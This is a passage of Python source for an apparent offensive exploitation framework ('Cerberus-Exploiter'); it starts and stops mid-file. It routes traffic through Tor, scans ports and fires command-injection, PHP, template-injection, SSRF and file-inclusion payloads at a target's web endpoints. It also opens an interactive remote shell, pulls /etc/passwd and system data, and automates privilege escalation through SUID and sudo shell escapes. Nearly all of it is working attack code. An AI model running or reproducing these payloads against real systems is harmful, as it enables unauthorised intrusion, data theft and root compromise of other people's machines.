                print(f"{Colors.YELLOW}[!] RDP service active - check for BlueKeep and weak credentials{Colors.END}")
                return True
        except:
            pass
            
        return False
    
    def _exploit_generic_advanced(self, port: int, service: str):
        """Advanced generic service exploitation"""
        print(f"{Colors.CYAN}[>] Advanced analysis for {service} on port {port}{Colors.END}")
        
        # Banner grabbing for more info
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            if banner:
                print(f"{Colors.YELLOW}[!] Service banner: {banner[:100]}...{Colors.END}")
        except:
            pass
            
        print(f"{Colors.YELLOW}[!] {service} on port {port} - multiple exploitation vectors possible{Colors.END}")
        return False


class TorManager:
    """Manage TOR proxy connections with improved detection"""
    
    def __init__(self, tor_port: int = 9050, control_port: int = 9051):
        self.tor_port = tor_port
        self.control_port = control_port
        self.original_socket = socket.socket
        
    def enable_tor(self):
        """Route traffic through TOR with multiple verification methods"""
        if not TOR_AVAILABLE:
            print(f"{Colors.RED}[-] PySocks not installed. Install with: pip install PySocks{Colors.END}")
            return False
            
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            socket.socket = socks.socksocket
            
            print(f"{Colors.YELLOW}[*] Testing TOR connection...{Colors.END}")
            
            if self._test_tor_socket():
                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (socket test){Colors.END}")
                return True
                
            if self._test_tor_http():
                print(f"{Colors.GREEN}[+] TOR proxy enabled successfully (HTTP test){Colors.END}")
                return True
                
            if self._check_tor_process():
                print(f"{Colors.YELLOW}[!] TOR process is running but connection test failed{Colors.END}")
                return True
                
            print(f"{Colors.RED}[-] All TOR connection tests failed{Colors.END}")
            self.disable_tor()
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] TOR setup failed: {str(e)}{Colors.END}")
            self.disable_tor()
            return False
    
    def _test_tor_socket(self):
        """Test TOR with direct socket connection"""
        try:
            test_socket = socks.socksocket()
            test_socket.settimeout(10)
            test_socket.connect(("check.torproject.org", 80))
            test_socket.send(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
            response = test_socket.recv(1024).decode()
            test_socket.close()
            
            if "Congratulations" in response:
                return True
        except:
            pass
        return False
    
    def _test_tor_http(self):
        """Test TOR with HTTP requests"""
        try:
            session = requests.Session()
            session.proxies = {
                'http': f'socks5h://127.0.0.1:{self.tor_port}',
                'https': f'socks5h://127.0.0.1:{self.tor_port}'
            }
            
            tor_check_urls = [
                "http://check.torproject.org/",
                "http://ipinfo.io/json",
                "http://httpbin.org/ip"
            ]
            
            for url in tor_check_urls:
                try:
                    response = session.get(url, timeout=10)
                    if "Congratulations" in response.text:
                        print(f"{Colors.GREEN}[+] TOR verified via {url}{Colors.END}")
                        return True
                    elif response.status_code == 200:
                        print(f"{Colors.YELLOW}[*] TOR connection working (via {url}){Colors.END}")
                        return True
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.RED}[-] HTTP TOR test failed: {str(e)}{Colors.END}")
            
        return False
    
    def _check_tor_process(self):
        """Check if TOR process is running"""
        try:
            result = subprocess.run(['pgrep', 'tor'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Colors.YELLOW}[*] TOR process is running (PID: {result.stdout.strip()}){Colors.END}")
                return True
                
            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
            if f":{self.tor_port}" in result.stdout:
                print(f"{Colors.YELLOW}[*] TOR port {self.tor_port} is listening{Colors.END}")
                return True
                
        except Exception as e:
            print(f"{Colors.RED}[-] Process check failed: {str(e)}{Colors.END}")
            
        return False
    
    def disable_tor(self):
        """Restore normal socket operations"""
        if TOR_AVAILABLE:
            socks.set_default_proxy()
            socket.socket = self.original_socket
        print(f"{Colors.YELLOW}[*] TOR proxy disabled{Colors.END}")

class NetworkScanner:
    """Enhanced network scanning operations"""
    
    @staticmethod
    def port_scan(target: str, port: int) -> bool:
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except Exception as e:
            return False

    @staticmethod
    def enhanced_service_detection(target: str, port: int) -> str:
        """Enhanced service detection with banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
        
            probes = [
                b"GET / HTTP/1.0\r\n\r\n",
                b"HEAD / HTTP/1.0\r\n\r\n", 
                b"OPTIONS / HTTP/1.0\r\n\r\n"
            ]
        
            for probe in probes:
                try:
                    sock.send(probe)
                    response = sock.recv(2048).decode('utf-8', errors='ignore')
                
                    if "Apache" in response:
                        sock.close()
                        return "Apache HTTP Server"
                    elif "nginx" in response:
                        sock.close()
                        return "nginx"
                    elif "IIS" in response:
                        sock.close()
                        return "Microsoft IIS"
                    elif "Tomcat" in response:
                        sock.close()
                        return "Apache Tomcat"
                except:
                    continue
                
            sock.close()
            return "HTTP Service"
        
        except Exception as e:
            return f"Service detection failed: {str(e)}"

    @staticmethod
    def quick_port_scan(target: str, ports: List[int]) -> Dict[int, bool]:
        """Quickly scan multiple ports"""
        open_ports = {}
        
        def scan_port(port):
            return port, NetworkScanner.port_scan(target, port)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan_port, port) for port in ports]
            for future in concurrent.futures.as_completed(futures):
                port, is_open = future.result()
                open_ports[port] = is_open
        
        return open_ports

class CommandExecutionEngine:
    """ENHANCED command execution with advanced RCE exploitation"""
    
    def __init__(self, target: str, port: int, found_endpoints: list = None):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.session.timeout = 5
        self.working_method = None
        self.working_url = None
        self.working_param = None
        self.found_endpoints = found_endpoints or []
        self.rce_exploiter = IntelligentRCEExploiter(target, port)
        self.advanced_exploiter = AdvancedRCEExploiter(target, port)
        
    def execute_command(self, command: str) -> str:
        """EXECUTE COMMANDS using advanced exploitation techniques"""
        
        # PRIORITY 1: Use found RCE endpoints with advanced techniques
        for endpoint in self.found_endpoints:
            result = self.rce_exploiter.exploit_found_endpoint(endpoint, command)
            if result and "Command execution failed" not in result:
                return result
        
        # PRIORITY 2: Comprehensive RCE attack
        print(f"{Colors.CYAN}[>] Launching comprehensive RCE attack...{Colors.END}")
        comprehensive_result = self.advanced_exploiter.comprehensive_rce_attack()
        if "successful" in comprehensive_result.lower():
            # Try command execution after successful RCE
            test_result = self._execute_after_rce(command)
            if test_result:
                return test_result
        
        # PRIORITY 3: If we already found a working method, use it
        if self.working_method and self.working_url:
            result = self._execute_with_known_method(command)
            if "Command execution failed" not in result:
                return result
        
        # PRIORITY 4: Traditional methods (fallback)
        return self._execute_traditional_methods(command)
    
    def _execute_after_rce(self, command: str) -> str:
        """Execute command after successful RCE establishment"""
        # Try through various assumed vectors after RCE
        vectors = [
            f"http://{self.target}:{self.port}/uploads/shell.php?cmd={command}",
            f"http://{self.target}:{self.port}/shell.php?c={command}",
            f"http://{self.target}:{self.port}/cmd.php?cmd={command}"
        ]
        
        for vector in vectors:
            try:
                response = self.session.get(vector, timeout=3, verify=False)
                if self._is_valid_response(response, command):
                    return response.text
            except:
                continue
        return None

    def _execute_traditional_methods(self, command: str) -> str:
        """Execute using traditional exploitation methods"""
        methods = [
            ("Command Injection", self._get_injection_urls(), self._generate_injection_payloads),
            ("PHP Injection", self._get_php_urls(), self._generate_php_payloads),
            ("Template Injection", self._get_template_urls(), self._generate_template_payloads),
            ("SSRF", self._get_ssrf_urls(), self._generate_ssrf_payloads),
            ("File Inclusion", self._get_file_inclusion_urls(), self._generate_file_inclusion_payloads)
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_method = {
                executor.submit(self._try_execution_method, method_name, payload_generator(command), test_urls, command): 
                method_name for method_name, test_urls, payload_generator in methods
            }
            
            for future in concurrent.futures.as_completed(future_to_method):
                result = future.result()
                if result and "Command execution failed" not in result:
                    return result
        
        return f"{Colors.RED}[-] Command execution failed - no working method found{Colors.END}"
    
    def _execute_with_known_method(self, command: str) -> str:
        """Execute command using previously discovered working method"""
        try:
            if self.working_method == "Command Injection":
                payloads = self._generate_injection_payloads(command)
            elif self.working_method == "PHP Injection":
                payloads = self._generate_php_payloads(command)
            elif self.working_method == "Template Injection":
                payloads = self._generate_template_payloads(command)
            else:
                payloads = self._generate_injection_payloads(command)
            
            for payload in payloads:
                try:
                    if self.working_param:
                        response = self.session.post(
                            self.working_url,
                            data={self.working_param: payload},
                            timeout=3,
                            verify=False,
                            headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                        )
                    else:
                        response = self.session.get(
                            self.working_url,
                            timeout=3,
                            verify=False,
                            headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                        )
                    
                    if self._is_valid_response(response, command):
                        return response.text
                except:
                    continue
        except Exception as e:
            pass
        
        return f"{Colors.RED}[-] Previously working method failed{Colors.END}"
    
    def _generate_injection_payloads(self, command: str):
        return [
            f";{command};",
            f"|{command}",
            f"`{command}`",
            f"$({command})",
            f"||{command}",
            f"&&{command}",
            f"\n{command}\n",
            f"127.0.0.1;{command}",
            f"localhost|{command}",
            f"$({{{command}}})"
        ]
    
    def _generate_php_payloads(self, command: str):
        encoded_command = base64.b64encode(command.encode()).decode()
        return [
            f"system('{command}');",
            f"exec('{command}');",
            f"shell_exec('{command}');",
            f"passthru('{command}');",
            f"`{command}`",
            f"<?php system('{command}'); ?>",
            f"<?php echo shell_exec('{command}'); ?>",
            f"<?php system(base64_decode('{encoded_command}')); ?>"
        ]
    
    def _generate_template_payloads(self, command: str):
        return [
            f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('{command}',shell=True,stdout=-1).communicate()[0].strip()}}}}",
            f"{{% import os %}}{{% os.system('{command}') %}}",
            f"${{7*7}}",
            f"#{{7*7}}",
            f"@(7+7)"
        ]
    
    def _generate_ssrf_payloads(self, command: str):
        return [
            f"http://localhost:8000/$({{{command}}})",
            f"file:///etc/passwd$({command})",
            f"gopher://127.0.0.1:22/{command}"
        ]
    
    def _generate_file_inclusion_payloads(self, command: str):
        return [
            f"../../../../../../../../etc/passwd$({command})",
            f"....//....//....//....//etc/passwd$({command})",
            f"php://filter/convert.base64-encode/resource=index.php$({command})"
        ]
    
    def _get_injection_urls(self):
        return [
            f"http://{self.target}:{self.port}/ping",
            f"http://{self.target}:{self.port}/api/ping",
            f"http://{self.target}:{self.port}/admin/ping",
            f"http://{self.target}:{self.port}/cmd",
            f"http://{self.target}:{self.port}/exec",
            f"http://{self.target}:{self.port}/system",
            f"http://{self.target}:{self.port}/run",
            f"http://{self.target}:{self.port}/shell",
            f"http://{self.target}:{self.port}/command",
            f"http://{self.target}:{self.port}/api/execute"
        ]
    
    def _get_php_urls(self):
        return [
            f"http://{self.target}:{self.port}/index.php",
            f"http://{self.target}:{self.port}/admin.php",
            f"http://{self.target}:{self.port}/api.php",
            f"http://{self.target}:{self.port}/test.php",
            f"http://{self.target}:{self.port}/debug.php",
            f"http://{self.target}:{self.port}/cmd.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php"
        ]
    
    def _get_template_urls(self):
        return [
            f"http://{self.target}:{self.port}/",
            f"http://{self.target}:{self.port}/admin",
            f"http://{self.target}:{self.port}/api",
            f"http://{self.target}:{self.port}/user",
            f"http://{self.target}:{self.port}/profile",
            f"http://{self.target}:{self.port}/dashboard"
        ]
    
    def _get_ssrf_urls(self):
        return [
            f"http://{self.target}:{self.port}/fetch",
            f"http://{self.target}:{self.port}/proxy",
            f"http://{self.target}:{self.port}/url",
            f"http://{self.target}:{self.port}/webhook",
            f"http://{self.target}:{self.port}/request"
        ]
    
    def _get_file_inclusion_urls(self):
        return [
            f"http://{self.target}:{self.port}/file",
            f"http://{self.target}:{self.port}/view",
            f"http://{self.target}:{self.port}/load",
            f"http://{self.target}:{self.port}/include",
            f"http://{self.target}:{self.port}/template"
        ]
    
    def _try_execution_method(self, method_name: str, payloads: list, test_urls: list, original_command: str) -> str:
        print(f"{Colors.CYAN}[>] Trying {method_name}...{Colors.END}")
        
        for url in test_urls:
            for payload in payloads[:3]:  # Limit payloads to prevent hanging
                try:
                    # Test with POST data
                    data_payloads = {
                        'ip': f"127.0.0.1{payload}",
                        'host': f"localhost{payload}",
                        'cmd': payload,
                        'command': payload,
                        'exec': payload,
                        'system': payload,
                        'query': payload,
                        'input': payload,
                        'data': payload,
                        'username': payload,
                        'password': payload,
                        'file': payload,
                        'path': payload,
                        'url': payload,
                        'page': payload,
                        'template': payload
                    }
                    
                    for param_name, param_value in data_payloads.items():
                        try:
                            response = self.session.post(
                                url,
                                data={param_name: param_value},
                                timeout=2,  # Shorter timeout
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                            )
                            if self._is_valid_response(response, original_command):
                                print(f"{Colors.GREEN}[+] {method_name} SUCCESS via {url} param: {param_name}{Colors.END}")
                                # Store working method for future use
                                self.working_method = method_name
                                self.working_url = url
                                self.working_param = param_name
                                return response.text
                        except:
                            pass
                    
                    # Test with GET parameters
                    for param_name, param_value in data_payloads.items():
                        try:
                            test_url = f"{url}?{param_name}={requests.utils.quote(param_value)}"
                            response = self.session.get(
                                test_url, 
                                timeout=2,  # Shorter timeout
                                verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 Cerberus-Exploiter'}
                            )
                            if self._is_valid_response(response, original_command):
                                print(f"{Colors.GREEN}[+] {method_name} SUCCESS via {test_url}{Colors.END}")
                                self.working_method = method_name
                                self.working_url = url
                                self.working_param = param_name
                                return response.text
                        except:
                            pass
                            
                except Exception as e:
                    continue
        
        return None
    
    def _is_valid_response(self, response, original_command: str) -> bool:
        if response.status_code != 200:
            return False
        
        content = response.text
        
        # Check for common error pages
        error_indicators = ['error', 'not found', '404', '500', 'forbidden', 'internal server error']
        if any(indicator in content.lower() for indicator in error_indicators):
            return False
        
        # Check if it's likely HTML page (not command output)
        if any(tag in content.lower() for tag in ['<html', '<!doctype', '<head>', '<body>']):
            return False
        
        # Command-specific validation
        if original_command:
            if 'whoami' in original_command and ('root' in content or 'user' in content or 'admin' in content):
                return True
            if 'id' in original_command and ('uid=' in content or 'gid=' in content):
                return True
            if 'pwd' in original_command and ('/' in content and len(content) < 100):
                return True
            if 'echo CERBERUS_TEST' in original_command and 'CERBERUS_TEST' in content:
                return True
            if 'uname' in original_command and ('Linux' in content or 'Windows' in content):
                return True
        
        # Generic validation
        return len(content) > 0 and len(content) < 1000 and not content.strip().startswith('<!')

class RealShellManager:
    """ENHANCED shell manager with intelligent command execution"""
    
    def __init__(self, target: str, port: int, report_manager, found_endpoints: list = None):
        self.target = target
        self.port = port
        self.report_manager = report_manager
        self.execution_engine = CommandExecutionEngine(target, port, found_endpoints)
        self.has_real_access = False
        self.current_access_level = "unknown"
        
    def test_command_execution(self) -> bool:
        """ACTUALLY test and establish command execution with intelligent RCE"""
        print(f"{Colors.CYAN}[>] Establishing REAL command execution...{Colors.END}")
        
        test_commands = [
            "whoami",
            "id", 
            "echo CERBERUS_TEST",
            "pwd",
            "uname -a"
        ]
        
        for cmd in test_commands:
            print(f"{Colors.CYAN}[>] Testing: {cmd}{Colors.END}")
            result = self.execution_engine.execute_command(cmd)
            
            if (result and 
                "Command execution failed" not in result and
                not any(error in result for error in ['Error', 'Not Found', '404']) and
                len(result.strip()) > 0):
                
                print(f"{Colors.GREEN}[+] Command execution VERIFIED: {result.strip()}{Colors.END}")
                
                # Determine access level
                if 'root' in result.lower():
                    self.current_access_level = "root"
                elif 'admin' in result.lower():
                    self.current_access_level = "admin"
                else:
                    self.current_access_level = "user"
                
                self.has_real_access = True
                return True
        
        print(f"{Colors.RED}[-] Could not establish real command execution{Colors.END}")
        self.has_real_access = False
        return False
    
    def execute_real_command(self, command: str) -> str:
        """Execute commands with REAL capabilities"""
        if not self.has_real_access:
            return f"{Colors.RED}[-] No command execution established{Colors.END}"
        
        return self.execution_engine.execute_command(command)
    
    def interactive_shell(self):
        """REAL interactive shell"""
        if not self.has_real_access:
            print(f"{Colors.RED}[-] Establish command execution first!{Colors.END}")
            return
        
        print(f"\n{Colors.GREEN}[+] Starting REAL interactive shell{Colors.END}")
        print(f"{Colors.YELLOW}[*] Type 'exit' to return to menu{Colors.END}")
        
        while True:
            try:
                cmd = input(f"{Colors.RED}shell@{self.target}:{self.port}$ {Colors.END}").strip()
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                elif cmd.lower() == '':
                    continue
                
                result = self.execute_real_command(cmd)
                print(result)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
    
    def extract_real_data(self) -> dict:
        """Extract REAL data from target"""
        if not self.has_real_access:
            print(f"{Colors.RED}[-] No command execution capability{Colors.END}")
            return {}
        
        print(f"{Colors.CYAN}[>] Extracting real data from target...{Colors.END}")
        
        real_data = {}
        
        # System information
        system_commands = {
            "/etc/passwd": "cat /etc/passwd",
            "/etc/hosts": "cat /etc/hosts", 
            "/proc/version": "cat /proc/version",
            "/etc/issue": "cat /etc/issue",
            "/etc/os-release": "cat /etc/os-release",
            "network_info": "ifconfig || ip addr",
            "processes": "ps aux",
            "users": "whoami && id"
        }
        
        for file_path, command in system_commands.items():
            content = self.execute_real_command(command)
            
            if (content and 
                "Command execution failed" not in content and
                "FILE_NOT_FOUND" not in content and
                len(content) > 10):
                
                real_data[file_path] = content
                print(f"{Colors.GREEN}[+] Extracted: {file_path}{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Failed to extract: {file_path}{Colors.END}")
        
        return real_data

class WebVulnerabilityScanner:
    """ENHANCED web vulnerability scanning with immediate exploitation"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.session.timeout = 2
        self.rce_exploiter = IntelligentRCEExploiter(target, port)
        self.advanced_exploiter = AdvancedRCEExploiter(target, port)
        self.found_rce_endpoints = []
        
    def scan_rce_endpoints(self):
        """ADVANCED RCE endpoint scanning with comprehensive exploitation"""
        print(f"{Colors.CYAN}[>] Advanced RCE endpoint scanning...{Colors.END}")
        
        endpoints = [
            '/api/v1/execute', '/api/exec', '/api/command', '/api/rce',
            '/admin/exec', '/admin/cmd', '/admin/system', '/admin/tools',
            '/cmd', '/exec', '/system', '/run', '/shell', '/terminal',
            '/console', '/debug', '/debugger', '/testing',
            '/cgi-bin/exec', '/cgi-bin/cmd', '/cgi-bin/test.cgi',
            '/webshell', '/backdoor', '/phpbash', '/shell.php',
            '/cmd.php', '/exec.php', '/system.php'
        ]
        
        for endpoint in endpoints:
            url = f"http://{self.target}:{self.port}{endpoint}"
            try:
                response = self.session.get(url, timeout=2, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[!] Accessible RCE endpoint found: {endpoint}{Colors.END}")
                    self.found_rce_endpoints.append(endpoint)
                    
                    # ADVANCED EXPLOITATION TESTING
                    print(f"{Colors.CYAN}[>] Advanced exploitation testing: {endpoint}{Colors.END}")
                    test_result = self.rce_exploiter.exploit_found_endpoint(endpoint, "whoami")
                    if "Command execution failed" not in test_result:
                        print(f"{Colors.GREEN}[+] SUCCESSFUL RCE via {endpoint}: {test_result}{Colors.END}")
                        return True
                        
            except Exception as e:
                continue
        
        # If no direct RCE, try comprehensive attack
        if not self.found_rce_endpoints:
            print(f"{Colors.CYAN}[>] No direct RCE endpoints, launching comprehensive attack...{Colors.END}")
            result = self.advanced_exploiter.comprehensive_rce_attack()
            if "successful" in result.lower():
                print(f"{Colors.GREEN}[+] Comprehensive RCE attack successful: {result}{Colors.END}")
                return True
        
        return len(self.found_rce_endpoints) > 0
        
    def scan_sql_injection(self):
        """Fast SQL injection scanning"""
        print(f"{Colors.CYAN}[>] Scanning for SQL injection...{Colors.END}")
        
        test_urls = [
            f"http://{self.target}:{self.port}/login",
            f"http://{self.target}:{self.port}/search",
            f"http://{self.target}:{self.port}/products",
            f"http://{self.target}:{self.port}/user",
            f"http://{self.target}:{self.port}/id"
        ]
        
        sql_payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--"]
        
        for url in test_urls:
            for payload in sql_payloads:
                try:
                    # Test POST with timeout
                    response = self.session.post(url, data={
                        'username': payload,
                        'password': payload,
                        'query': payload,
                        'search': payload,
                        'id': payload
                    }, timeout=2)
                    
                    if any(indicator in response.text for indicator in ['mysql_fetch', 'ORA-', 'SQL syntax', 'PostgreSQL']):
                        print(f"{Colors.GREEN}[+] SQL Injection found at {url}{Colors.END}")
                        return True
                        
                except:
                    continue
                
                # Test GET with timeout
                try:
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url, timeout=2)
                    if any(indicator in response.text for indicator in ['mysql_fetch', 'ORA-', 'SQL syntax']):
                        print(f"{Colors.GREEN}[+] SQL Injection found at {test_url}{Colors.END}")
                        return True
                except:
                    continue
        
        return False
    
    def scan_xss(self):
        """Fast XSS scanning"""
        print(f"{Colors.CYAN}[>] Scanning for XSS...{Colors.END}")
        
        xss_payload = "<script>alert('XSS')</script>"
        
        test_urls = [
            f"http://{self.target}:{self.port}/search",
            f"http://{self.target}:{self.port}/comment",
            f"http://{self.target}:{self.port}/contact"
        ]
        
        for url in test_urls:
            try:
                response = self.session.post(url, data={
                    'query': xss_payload,
                    'comment': xss_payload,
                    'message': xss_payload
                }, timeout=2)
                
                if xss_payload in response.text:
                    print(f"{Colors.GREEN}[+] XSS vulnerability found at {url}{Colors.END}")
                    return True
            except:
                continue
        
        return False

    def scan_rce_endpoints(self):
        """ENHANCED RCE endpoint scanning with immediate exploitation"""
        print(f"{Colors.CYAN}[>] Scanning for RCE endpoints...{Colors.END}")
        
        endpoints = [
            '/api/v1/execute', '/api/exec', '/api/command', '/api/rce',
            '/admin/exec', '/admin/cmd', '/admin/system',
            '/cmd', '/exec', '/system', '/run', '/shell',
            '/console', '/debug', '/terminal',
            '/cgi-bin/exec', '/cgi-bin/cmd',
            '/webshell', '/backdoor', '/phpbash'
        ]
        
        for endpoint in endpoints:
            url = f"http://{self.target}:{self.port}{endpoint}"
            try:
                response = self.session.get(url, timeout=2, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[!] Accessible RCE endpoint found: {endpoint}{Colors.END}")
                    self.found_rce_endpoints.append(endpoint)
                    
                    # IMMEDIATELY TEST EXPLOITATION
                    print(f"{Colors.CYAN}[>] Immediately testing exploitation: {endpoint}{Colors.END}")
                    test_result = self.rce_exploiter.exploit_found_endpoint(endpoint, "whoami")
                    if "Command execution failed" not in test_result:
                        print(f"{Colors.GREEN}[+] SUCCESSFUL RCE via {endpoint}: {test_result}{Colors.END}")
                        return True
                        
            except Exception as e:
                continue
        
        return len(self.found_rce_endpoints) > 0

class NetworkExploiter:
    """Enhanced network service exploitation"""
    
    def __init__(self, target: str):
        self.target = target
        
    def comprehensive_scan(self):
        """Comprehensive network scan"""
        print(f"{Colors.CYAN}[>] Performing comprehensive network scan...{Colors.END}")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        open_ports = NetworkScanner.quick_port_scan(self.target, common_ports)
        
        for port, is_open in open_ports.items():
            if is_open:
                service = NetworkScanner.enhanced_service_detection(self.target, port)
                print(f"{Colors.GREEN}[+] Port {port} open - {service}{Colors.END}")
        
        return len([p for p in open_ports.values() if p]) > 0

class PrivilegeEscalation:
    """Real privilege escalation techniques"""
    
    def __init__(self, shell_manager: RealShellManager):
        self.shell_manager = shell_manager
        
    def attempt_escalation(self):
        """Attempt various privilege escalation methods"""
        print(f"{Colors.CYAN}[>] Attempting privilege escalation...{Colors.END}")
        
        methods = [
            self._check_suid_binaries,
            self._check_sudo_permissions,
            self._check_cron_jobs,
            self._check_capabilities,
            self._check_writable_files,
            self._exploit_suid_binaries,
            self._exploit_sudo_misconfig
        ]
        
        for method in methods:
            if method():
                return True
        
        return False
    
    def _check_suid_binaries(self):
        """Check for exploitable SUID binaries"""
        print(f"{Colors.CYAN}[>] Checking SUID binaries...{Colors.END}")
        
        result = self.shell_manager.execute_real_command("find / -perm -4000 -type f 2>/dev/null | head -20")
        if result and "Command execution failed" not in result:
            exploitable_binaries = ['/bin/bash', '/bin/dash', '/usr/bin/find', '/usr/bin/nmap', '/usr/bin/vim']
            
            for binary in exploitable_binaries:
                if binary in result:
                    print(f"{Colors.GREEN}[+] Exploitable SUID binary found: {binary}{Colors.END}")
                    return True
            
            return False
        return False
    
    def _check_sudo_permissions(self):
        """Check sudo permissions"""
        print(f"{Colors.CYAN}[>] Checking sudo permissions...{Colors.END}")
        
        result = self.shell_manager.execute_real_command("sudo -l 2>/dev/null")
        if result and "not allowed" not in result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] Sudo permissions found:{Colors.END}")
            print(result)
            return True
        return False
    
    def _check_cron_jobs(self):
        """Check for exploitable cron jobs"""
        result = self.shell_manager.execute_real_command("ls -la /etc/cron* /var/spool/cron 2>/dev/null")
        if result and "Command execution failed" not in result:
            print(f"{Colors.YELLOW}[!] Cron jobs found{Colors.END}")
            return True
        return False
    
    def _check_capabilities(self):
        """Check Linux capabilities"""
        result = self.shell_manager.execute_real_command("getcap -r / 2>/dev/null")
        if result and "Command execution failed" not in result and result.strip():
            print(f"{Colors.YELLOW}[!] Capabilities found:{Colors.END}")
            print(result)
            return True
        return False
    
    def _check_writable_files(self):
        """Check writable system files"""
        result = self.shell_manager.execute_real_command("find /etc -writable 2>/dev/null | head -10")
        if result and "Command execution failed" not in result and result.strip():
            print(f"{Colors.YELLOW}[!] Writable system files:{Colors.END}")
            print(result)
            return True
        return False

    def _exploit_suid_binaries(self) -> bool:
        """Actually exploit misconfigured SUID binaries"""
        print(f"{Colors.CYAN}[>] Exploiting SUID binaries...{Colors.END}")
        
        suid_find_command = "find / -perm -4000 -type f 2>/dev/null"
        suid_binaries_result = self.shell_manager.execute_real_command(suid_find_command)
        
        if not suid_binaries_result or "Command execution failed" in suid_binaries_result:
            return False
        
        exploitable_binaries = {
            '/bin/bash': ['bash -p', 'bash -c "bash -p"'],
            '/bin/dash': ['dash -p', 'dash -c "dash -p"'],
            '/usr/bin/find': ['find . -exec /bin/sh \\; -quit', 'find / -exec /bin/sh \\; -quit'],
            '/usr/bin/nmap': ['nmap --interactive', 'nmap -i'],
            '/usr/bin/vim': ['vim -c ":!bash"'],
            '/usr/bin/less': ['less /etc/passwd', '!/bin/sh'],
            '/usr/bin/more': ['more /etc/passwd', '!/bin/sh'],
            '/usr/bin/awk': ['awk "BEGIN {system(\"/bin/sh\")}"'],
            '/usr/bin/man': ['man man', '!/bin/sh'],
            '/usr/bin/sudo': ['sudo bash']
        }
        
        for binary, exploits in exploitable_binaries.items():
            if binary in suid_binaries_result:
                print(f"{Colors.GREEN}[+] Attempting to exploit {binary}{Colors.END}")
                
                for exploit in exploits:
                    result = self.shell_manager.execute_real_command(exploit)
                    if result and "root" in result.lower():
                        print(f"{Colors.GREEN}[+] SUCCESS! Root access obtained via {binary}{Colors.END}")
                        return True
        
        return False

    def _exploit_sudo_misconfig(self) -> bool:
        """Actually exploit sudo misconfigurations"""
        print(f"{Colors.CYAN}[>] Exploiting sudo misconfigurations...{Colors.END}")
        
        sudo_l_result = self.shell_manager.execute_real_command("sudo -l 2>/dev/null")
        
        if not sudo_l_result or "not allowed" in sudo_l_result or "Command execution failed" in sudo_l_result:
            return False
        
        # Check for common exploitable patterns
        exploitable_patterns = {
            'ALL': 'sudo bash',
            'NOPASSWD': 'sudo -i',
            '/bin/bash': 'sudo /bin/bash',
            '/bin/sh': 'sudo /bin/sh',
            'find': 'sudo find / -exec /bin/sh \\;',
            'awk': 'sudo awk "BEGIN {system(\"/bin/sh\")}"',
            'perl': 'sudo perl -e "exec \'/bin/sh\'"',
            'python': 'sudo python -c "import os; os.system(\'/bin/sh\')"',
            'vim': 'sudo vim -c ":!bash"',
            'less': 'sudo less /etc/passwd',
            'more': 'sudo more /etc/passwd'
        }
        
        for pattern, exploit in exploitable_patterns.items():
            if pattern in sudo_l_result:
                print(f"{Colors.GREEN}[+] Exploiting sudo pattern: {pattern}{Colors.END}")
                result = self.shell_manager.execute_real_command(exploit)
                if result and "root" in result.lower():
                    print(f"{Colors.GREEN}[+] SUDO EXPLOIT SUCCESS! Root access obtained{Colors.END}")
                    return True
        
        return False

class ComprehensiveScanner:
    """ENHANCED main scanner with intelligent exploitation"""
    
    def __init__(self):
        self.banner()
        self.report_data = {
            'scan_start_time': datetime.now().isoformat(),
            'target': '',
            'findings': [],
            'exploitation_attempts': []
        }
        self.tor_manager = TorManager()
        
    def banner(self):
        print(f"""{Colors.CYAN}
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
